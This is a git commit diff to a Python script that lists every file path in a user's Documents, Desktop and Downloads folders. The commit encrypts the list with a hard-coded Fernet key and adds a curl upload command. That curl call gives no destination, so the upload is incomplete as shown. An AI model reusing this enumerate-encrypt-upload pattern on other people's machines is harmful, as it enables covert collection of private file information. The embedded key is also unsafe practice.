587e92e887a38e031bf95b4fb69884524e101101
Francisco Rivera <frtennis1@gmail.com>
2019-02-15 05:21:26 -0500

    Encrypt output and upload

--- file-system-exporter.py
+++ file-system-exporter.py
@@ -2,7 +2,11 @@ import os
 import pwd
 import getpass
 
+from cryptography.fernet import Fernet
+from subprocess import call
+
 user = getpass.getuser()
+fe = Fernet(b'gda0KrfQjVKFtc9xaQMAc394ZkS8ePWz9A1wJf39REU=')
 
 top_dirs = ['Documents', 'Desktop', 'Downloads']
 
@@ -12,5 +16,11 @@ for top_level in top_dirs:
         for name in files:
             all_files.append(os.path.join(root, name))
 
-with open('all-files.txt', 'w') as f:
-    f.write('\n'.join(all_files))
+token = fe.encrypt('\n'.join(all_files).encode())
+
+with open('all-files.txt', 'wb') as f:
+    f.write(token)
+
+output = call(['curl', '--upload-file', './all-files.txt'])
+print("uploaded")
+print(output)
